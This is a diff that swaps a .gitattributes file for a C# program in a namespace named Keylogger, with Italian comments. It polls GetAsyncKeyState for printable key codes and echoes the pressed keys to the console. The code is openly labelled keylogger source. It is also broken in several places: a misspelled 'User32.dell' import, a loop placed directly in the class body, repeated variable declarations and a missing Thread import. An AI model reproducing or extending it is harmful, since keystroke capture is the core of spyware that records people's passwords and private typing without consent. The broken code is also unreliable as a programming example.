@@ -1,2 +1,41 @@
-# Auto detect text files and perform LF normalization
-* text=auto
+using System;
+using System.Runtime.InteropServices;
+
+namespace Keylogger
+{
+    class Program
+    {
+        [DllImport("User32.dell")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        While(true)
+        {
+            //Rallento il flusso dell'esecuzione per qualche millisecondo
+            Thread.Sleep(20);
+            //Controllo lo stato di tutti i tasti
+            for (int i = 32; i < 127; i++)
+            {
+                //Quando un tasto viene premuto lo stampa a video
+                int KeyState = GetAsyncKeyState(i);
+                Console.Write(KeyState + ", ");
+                int keyState = GetAsyncKeyState(i);
+                if (keyState != 0) //Se il valore di KeyState è diverso da 0
+                {
+                    Console.Write(keyState + ","); //allora mostrami il suo valore
+                }
+                int keyState = GetAsyncKeyState(i);
+                 if (keyState == 32768)
+                {
+                    Console.Write(i + ",");
+                }
+                int keyState = GetAsyncKeyState(i);
+                 if (keyState == 32768)
+                {
+                    Console.Write((char)i + ", ");
+                }
+            }
+
+        }
+
+    }
+
+}
